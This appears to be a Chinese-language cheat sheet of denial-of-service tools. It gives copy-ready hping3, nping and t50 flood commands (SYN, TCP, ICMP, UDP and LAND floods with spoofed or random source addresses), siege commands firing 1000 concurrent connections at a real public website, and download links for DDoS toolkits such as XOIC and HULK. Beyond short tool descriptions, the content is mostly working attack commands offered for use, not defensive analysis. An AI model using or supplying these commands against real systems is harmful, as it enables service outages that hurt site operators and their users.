
# 拒绝服务工具

* RUDY

* Hping3

* nping 

* Namp


* 工具包

## RUDY

> 慢速应用层HTTP POST攻击，与slowhttptest原理相同  
> 每次只传输一个字节的数据  
> 美剧“黑客军团”中曾提到过此攻击手段  
> 攻击有表单WEB页面，攻击时需指定攻击的参数名称  
> https://sourceforge.net/projects/r-u-dead-yet/   

## Hping3
> 几乎可以定制发送TCP/IP数据包，用于测试FW、端口扫描、性能测试
``` 
usage: hping3 host [options]
  -v  --version   查看版本信息
  -c  --count     包的数量
  -i  --interval  间隔时间
      --fast      
      --faster    
      --flood	  尽可能快的发送数据包，不要回包（即泛洪攻击）
  -n  --numeric   不解析域名
  -q  --quiet     安静模式
  -I  --interface interface name (otherwise default routing interface)
  -V  --verbose   verbose mode
  -D  --debug     debugging info
  -z  --bind      bind ctrl+z to ttl           (default to dst port)
  -Z  --unbind    unbind ctrl+z
      --beep      beep for every matching packet received
Mode
  default mode     TCP
  -0  --rawip      RAW IP mode
  -1  --icmp       ICMP mode
  -2  --udp        UDP mode
  -8  --scan       SCAN mode.
                   Example: hping --scan 1-30,70-90 -S www.target.host
  -9  --listen     listen mode
IP
  -a  --spoof      伪造源地址
  --rand-dest      random destionation address mode. see the man.
  --rand-source    开启随机源地址模式
  -t  --ttl        ttl (default 64)
  -N  --id         id (default random)
  -W  --winid      use win* id byte ordering
  -r  --rel        relativize id field          (to estimate host traffic)
  -f  --frag       split packets in more frag.  (may pass weak acl)
  -x  --morefrag   set more fragments flag
  -y  --dontfrag   set don't fragment flag
  -g  --fragoff    set the fragment offset
  -m  --mtu        set virtual mtu, implies --frag if packet size > mtu
  -o  --tos        type of service (default 0x00), try --tos help
  -G  --rroute     includes RECORD_ROUTE option and display the route buffer
  --lsrr           loose source routing and record route
  --ssrr           strict source routing and record route
  -H  --ipproto    set the IP protocol field, only in RAW IP mode
ICMP
  -C  --icmptype   icmp type (default echo request)
  -K  --icmpcode   icmp code (default 0)
      --force-icmp send all icmp types (default send only supported types)
      --icmp-gw    set gateway address for ICMP redirect (default 0.0.0.0)
      --icmp-ts    Alias for --icmp --icmptype 13 (ICMP timestamp)
      --icmp-addr  Alias for --icmp --icmptype 17 (ICMP address subnet mask)
      --icmp-help  display help for others icmp options
UDP/TCP
  -s  --baseport   base source port             (default random)
  -p  --destport   目标端口
  -k  --keep       keep still source port
  -w  --win        窗口大小
  -O  --tcpoff     set fake tcp data offset     (instead of tcphdrlen / 4)
  -Q  --seqnum     shows only tcp sequence number
  -b  --badcksum   (try to) send packets with a bad IP checksum
                   many systems will fix the IP checksum sending the packet
                   so you'll get bad UDP/TCP checksum instead.
  -M  --setseq     set TCP sequence number
  -L  --setack     set TCP ack
  -F  --fin        set FIN flag
  -S  --syn        set SYN flag
  -R  --rst        set RST flag
  -P  --push       set PUSH flag
  -A  --ack        set ACK flag
  -U  --urg        set URG flag
  -X  --xmas       set X unused flag (0x40)
  -Y  --ymas       set Y unused flag (0x80)
  --tcpexitcode    use last tcp->th_flags as exit code
  --tcp-mss        enable the TCP MSS option with the given value
  --tcp-timestamp  enable the TCP timestamp option to guess the HZ/uptime
Common
  -d  --data       数据大小                (default is 0)
  -E  --file       data from file
  -e  --sign       add 'signature'
  -j  --dump       dump packets in hex
  -J  --print      dump printable characters
  -B  --safe       enable 'safe' protocol
  -u  --end        tell you when --file reached EOF and prevent rewind
  -T  --traceroute traceroute mode              (implies --bind and --ttl 1)
  --tr-stop        Exit when receive the first not ICMP in traceroute mode
  --tr-keep-ttl    Keep the source TTL fixed, useful to monitor just one hop
  --tr-no-rtt	    Don't calculate/show RTT information in traceroute mode
ARS packet description (new, unstable)
  --apd-send       Send the packet described with APD (see docs/APD.txt)
```

* Syn Flood攻击
``` 
hping3  -c 1000  -d 120  -S  -w 64  -p 80  --flood  --rand-source  192.168.1.25　　
hping3 -S -P -U -p 80 --flood --rand-source  192.168.1.119
```

* TCP Flood攻击
``` 
// 即建立3次完整的握手，非半连接，而是全连接，但是我发的量足够大，也可以达到拒绝服务的效果
 hping3 -SARFUP -p 80 --flood --rand-source 192.168.1.119 （TCP Flood）　　
```

* ICMP Flood攻击
``` 
hping3 -q -n -a 123.122.113.120 --icmp -d 1000 --flood 192.168.1.119　　// -a即伪造一个固定的源地址
```
* UDP Flood攻击
``` 
hping3 -a 1.1.1.1 --udp -s 53 -d 100 -p 53 --flood 1.1.1.2
```

* LAND攻击
``` 
// 特殊种类的SYN Flood攻击
// 源地址、目的地址都是受害者，受害者与自己完成三次握手
// 自己打自己，自己与自己建立完整的TCP三次握手，从而消耗带宽，消耗资源
hping3 -n -a 192.168.1.119   -S -d 100 -p 80 --flood  192.168.1.119
```

## nping 

* TCP全链接DoS攻击
``` 
// --rate表示一次建立10000个TCP连接，-c表示一共跟你建立100亿个连接
nping --tcp-connect --rate=10000 -c 1000000000 -q 192.168.1.119
```

* 查公网IP
``` 
nping --echo-client "public" echo.nmap.org --udp
```

## Siege
> http/https 压力测试工具，模拟多个用户并发访问请求

``` 
siege -g http://192.168.1.119　
siege -g http://1.1.1.1/a.php / 1.1.1.1
// -i 表示siege支持的几种方式中的一种，代表internet，-c 代表模拟1000并发，-A  siegehttp，随便写，表示仿冒的UA
siege -i -c 1000 http://www.4399.com  -A siegehttp
```

* 同时攻击多个url，使用 -f 调用字典文件
``` 
// 实时显示详细信息
siege -i -c 1000 http://www.4399.com  -A siegehttp  -vv　
```

* T50 网络压力测试(基于网络层的攻击，没有足够的数量，不要轻易尝试，容易造成自己的机器卡死)
``` 
t50 1.1.1.1 --flood --turbo -S --protocol TCP --dport 80
t50 1.1.1.1 --flood --turbo -S TCP UDP OSPF EIGRP --dport 22
```


## Namp
> grep dos /usr/share/nmap/scripts/script.db | cut -d "\"" -f 2


## 工具包
* LOIC

* HOIC

* DDoSer

* XOIC
```go 
git clone git://git.code.sf.net/p/xoic/code xoic-code
```


* HULK
```go 
https://packetstormsecurity.com/files/download/112856/hulk.zip
```

* DDoSIM

* GoldenEye
